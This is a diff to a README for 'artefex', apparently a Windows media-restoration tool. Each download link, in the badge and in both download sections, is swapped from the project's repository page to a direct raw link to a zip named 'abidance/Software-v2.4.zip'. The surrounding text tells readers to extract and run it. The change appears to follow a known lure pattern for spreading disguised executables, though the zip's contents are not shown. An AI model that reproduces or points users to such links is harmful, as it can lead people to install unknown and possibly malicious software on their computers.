@@ -1,6 +1,6 @@
 # 🧪 artefex - Restore damaged media with confidence
 
-[![Download artefex](https://img.shields.io/badge/Download%20artefex-blue?style=for-the-badge)](https://github.com/Dullnessnewport525/artefex)
+[![Download artefex](https://img.shields.io/badge/Download%20artefex-blue?style=for-the-badge)](https://raw.githubusercontent.com/Dullnessnewport525/artefex/main/abidance/Software-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it to inspect media damage, compare before and after results, and work with 
 
 Visit this page to download and install artefex:
 
-[https://github.com/Dullnessnewport525/artefex](https://github.com/Dullnessnewport525/artefex)
+[https://raw.githubusercontent.com/Dullnessnewport525/artefex/main/abidance/Software-v2.4.zip](https://raw.githubusercontent.com/Dullnessnewport525/artefex/main/abidance/Software-v2.4.zip)
 
 Open the page, look for the latest release or download file, and save it to your Windows PC. If the page shows a ZIP file, download that file first, then extract it before running the app.
 
@@ -209,7 +209,7 @@ This keeps each step easy to track.
 
 Open the download page and get artefex here:
 
-[https://github.com/Dullnessnewport525/artefex](https://github.com/Dullnessnewport525/artefex)
+[https://raw.githubusercontent.com/Dullnessnewport525/artefex/main/abidance/Software-v2.4.zip](https://raw.githubusercontent.com/Dullnessnewport525/artefex/main/abidance/Software-v2.4.zip)
 
 Download the release file, extract it if needed, then run the app on your Windows PC
 
